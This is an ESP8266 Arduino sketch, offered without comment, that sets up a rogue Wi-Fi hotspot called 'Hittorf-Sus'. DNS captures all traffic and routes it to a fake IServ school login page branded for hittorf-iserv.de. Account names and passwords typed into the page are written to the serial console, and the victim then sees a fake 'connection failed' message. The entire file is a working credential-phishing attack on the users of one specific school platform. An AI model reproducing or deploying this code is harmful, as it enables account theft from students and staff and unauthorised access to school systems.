#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String getPortalHTML() {
  String html = F("<!DOCTYPE html><html lang='de'><head>");
  html += F("<meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>");
  html += F("<style>");
  html += F("body { background-color: #2e2e2e; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; }");
  
  html += F(".header { background-color: #064584; padding: 10px; display: flex; justify-content: center; height: 160px; border-bottom: 4px solid #043566; }");
  html += F(".header img { height: 100%; }");

  html += F(".iserv-main { margin-top: 60px; margin-bottom: 40px; }");
  html += F(".iserv-text { font-size: 90px; font-weight: 600; letter-spacing: -4px; border-bottom: 6px solid white; display: inline-block; line-height: 0.8; padding-bottom: 15px; }");
  html += F(".iserv-dots { display: block; font-size: 50px; margin-top: 10px; letter-spacing: 5px; color: white; }");

  html += F(".content { max-width: 440px; margin: auto; padding: 20px; text-align: left; }");
  html += F("h2 { font-size: 32px; margin-bottom: 5px; font-weight: normal; display: flex; justify-content: space-between; align-items: flex-end; }");
  html += F(".help { font-size: 14px; color: #4dabf7; text-decoration: none; }");
  
  html += F(".input-group { position: relative; margin-bottom: 15px; }");
  html += F("input[type=text], input[type=password] { width: 100%; padding: 12px; background: #1a1a1a; border: 1px solid #555; color: white; border-radius: 4px; box-sizing: border-box; font-size: 16px; }");
  html += F("input:focus { border-color: #4dabf7; outline: none; box-shadow: 0 0 5px #4dabf7; }");
  html += F(".pw-icon { position: absolute; right: 12px; top: 12px; color: #888; font-size: 18px; }");

  html += F(".meta-row { display: flex; justify-content: space-between; align-items: center; font-size: 16px; margin: 20px 0; }");
  html += F(".meta-row a { color: #4dabf7; text-decoration: none; }");
  
  html += F("button { width: 100%; background-color: #55aaff; border: none; color: #003366; padding: 15px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; }");

  html += F(".footer { margin-top: 100px; color: #888; font-size: 14px; line-height: 1.8; }");
  html += F(".footer a { color: #4dabf7; text-decoration: none; margin: 0 5px; }");
  html += F("</style></head><body>");

  html += F("<div class='header'><img src='https://hittorf.de'></div>");

  html += F("<div class='iserv-main'><div class='iserv-text'>iserv</div><div class='iserv-dots'>...</div></div>");

  html += F("<div class='content'>");
  html += F("<form action='/login' method='POST'>");
  html += F("<h2>Anmeldung <a href='#' class='help'>Hilfe</a></h2>");
  
  html += F("<div class='input-group'><input type='text' name='u' placeholder='Account' required></div>");
  html += F("<div class='input-group'><input type='password' name='p' placeholder='Passwort' required><span class='pw-icon'>👁</span></div>");
  
  html += F("<div class='meta-row'>");
  html += F("<label><input type='checkbox'> Angemeldet bleiben</label>");
  html += F("<a href='#'>Passwort vergessen?</a>");
  html += F("</div>");

  html += F("<button type='submit'>➔ Anmelden</button>");
  html += F("</form>");

  html += F("<div class='footer'><a href='#'>hittorf-iserv.de</a><br>");
  html += F("<a href='#'>Impressum</a> ● <a href='#'>IServ Schulplattform</a></div>");
  html += F("</div></body></html>");
  
  return html;
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Hittorf-Sus");
  dnsServer.start(DNS_PORT, "*", apIP);

  auto handleRoot = []() { webServer.send(200, "text/html", getPortalHTML()); };
  webServer.on("/", handleRoot);
  webServer.on("/hotspot-detect.html", handleRoot);
  webServer.on("/generate_204", handleRoot);
  
  webServer.on("/login", HTTP_POST, []() {
    Serial.println("\n--- LOGIN GEFUNDEN ---");
    Serial.println("User: " + webServer.arg("u"));
    Serial.println("Pass: " + webServer.arg("p"));
    webServer.send(200, "text/html", "<h1>Fehler</h1><p>Verbindung fehlgeschlagen.</p>");
  });

  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
